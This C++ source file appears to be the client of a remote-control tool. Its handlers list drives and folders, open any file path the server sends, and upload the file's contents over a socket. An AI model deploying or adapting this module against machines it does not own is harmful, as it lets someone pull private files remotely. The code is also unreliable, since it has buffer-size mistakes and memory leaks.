#include "stdafx.h"
#include "Client.h"
#include <vector>
size_t g_nLen = 0;
FILE *g_fp = nullptr;
void OnServerFile(SOCKET s, char * pData, int nLength)
{
    //发送命令，告诉服务器收到数据可以创建screen
    tagPacket pkt;
    pkt.ucode = CLIENT_FILE_REPLY;
    pkt.nLength = 0;
    send(s,
        (char*)&pkt,
        sizeof(tagPacket),
        0);
}


void OnServerFileInit(SOCKET s, char* pData, int nSize)
{
    //get list of logical driver into vector
    std::vector<tagFile> vDriver;

    char* pDriver = nullptr;
    char szBuf[MAX_PATH] = { 0 };
    GetLogicalDriveStringsA(MAX_PATH, szBuf);
    pDriver = szBuf;
    while (*pDriver != NULL)
    {
        tagFile* pTFs = new tagFile();
        memcpy(pTFs->szFileName, pDriver, sizeof(pDriver));
        pTFs->nType = FILE_DRIVER;
        vDriver.push_back(*pTFs);

        //go to next driver
        pDriver += strlen(pDriver) + 1;
    }

    //combine to packet data
    int nLength = sizeof(int) + sizeof(tagFile) * vDriver.size();

    char *pBuf = new char[nLength];
    if (pBuf == NULL) {
        goto FILE_SAFE_EXIT;
    }

    *(int*)pBuf = vDriver.size();

    memcpy(pBuf + sizeof(int), vDriver.data(), nLength - sizeof(int));

    //send data to server
    SendData(s, CLIENT_FILE_INIT, pBuf, nLength);

    //safe exit
FILE_SAFE_EXIT:
    if (pBuf != nullptr)
    {
        delete[] pBuf;
        pBuf = nullptr;
    }
}

void OnServerFileData(SOCKET s, char* pData, int nSize)
{
    //declare variables
    std::vector<tagFile> vFile;

    //get folder & file under current path
    std::string strPath = pData;
    strPath.erase(nSize, strPath.back());
    if (strPath.back() != '\\')
    {
        strPath += "\\";
    }
    strPath += "*";

    WIN32_FIND_DATAA
        wfd = { 0 };
    HANDLE hFind = FindFirstFileA(strPath.c_str(), &wfd);
    if (INVALID_HANDLE_VALUE == hFind)
    {
        return;
    }
    int nItem = 0;
    do
    {
        if (!strcmp(("."), wfd.cFileName))
        {
            //found .
            continue;
        }
        else if (!strcmp((".."), wfd.cFileName))
        {
            //found ..
            tagFile *pNew = new tagFile;
            memset(pNew, 0, sizeof(tagFile));
            memcpy(pNew->szFileName, wfd.cFileName, strlen(wfd.cFileName));
            pNew->nType = FILE_BACK;
            vFile.push_back(*pNew);
            if (pNew != nullptr)
            {
                delete pNew;
            }
        }
        else if (wfd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)
        {
            //found system file
            continue;
        }
        else if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            //find a folder
            tagFile *pNew = new tagFile;
            memset(pNew, 0, sizeof(tagFile));
            memcpy(pNew->szFileName, wfd.cFileName, strlen(wfd.cFileName));
            pNew->nType = FILE_FOLDER;
            vFile.push_back(*pNew);
            if (pNew != nullptr)
            {
                delete pNew;
            }
        }
        else
        {
            //find a file
            tagFile *pNew = new tagFile;
            memset(pNew, 0, sizeof(tagFile));
            memcpy(pNew->szFileName, wfd.cFileName, strlen(wfd.cFileName));
            pNew->nType = FILE_FILE;
            vFile.push_back(*pNew);
            if (pNew != nullptr)
            {
                delete pNew;
            }
        }

    } while (FindNextFileA(hFind, &wfd));
    FindClose(hFind);

    //combine to packet data
    int nLength = sizeof(int) + sizeof(tagFile) * vFile.size() + strPath.size();

    char *pBuf = new char[nLength];
    if (pBuf == NULL) {
        goto FILE_SAFE_EXIT;
    }

    *(int*)pBuf = vFile.size();

    memcpy(pBuf + sizeof(int), vFile.data(), nLength - sizeof(int) - strPath.size());
    memcpy(pBuf + sizeof(int) + sizeof(tagFile) * vFile.size(),
        strPath.c_str(), strPath.size());

    //send data to server
    SendData(s, CLIENT_FILE_DATA, pBuf, nLength);

    //safe exit
FILE_SAFE_EXIT:
    if (pBuf != nullptr)
    {
        delete[] pBuf;
        pBuf = nullptr;
    }
}

/* For download */
void OnServerFileHeader(SOCKET s, char* pData, int nLength)
{
    std::string strPath = pData;
    strPath.erase(nLength, strPath.back());

    // 获取文件名字
    char name[_MAX_FNAME], ext[_MAX_EXT];
    _splitpath_s(strPath.data(), NULL, 0, NULL, 0,
        name, _MAX_FNAME, ext, _MAX_EXT);

    // 打开文件
    errno_t eRet = fopen_s(&g_fp, strPath.data(), "rb");
    if (eRet != 0)
    {
        return;
    }

    // 获取文件大小
    fseek(g_fp, 0, SEEK_END);
    g_nLen = ftell(g_fp);
    rewind(g_fp);

    // 发送文件头
    char* pHeader = new char[sizeof(FileHeader)];
    FileHeader header;
    sprintf_s(header.szFileName, _MAX_FNAME, "%s%s", name, ext);
    header.nLength = g_nLen;
    memcpy(pHeader, &header, sizeof(FileHeader));
    SendData(s, CLIENT_SEND_FILEHEADER, pHeader, sizeof(FileHeader));
}

void OnServerFileDownLoad(SOCKET s, char* pData, int nLength)
{
    // 发送文件数据
    char* pBuf = new char[g_nLen];

    // 读取文件
    fread(pBuf, 1, g_nLen, g_fp);

    // 发送数据包
    SendData(s, CLIENT_SEND_FILE, pBuf, g_nLen);
    // 关闭已经打开的文件
    fclose(g_fp);
}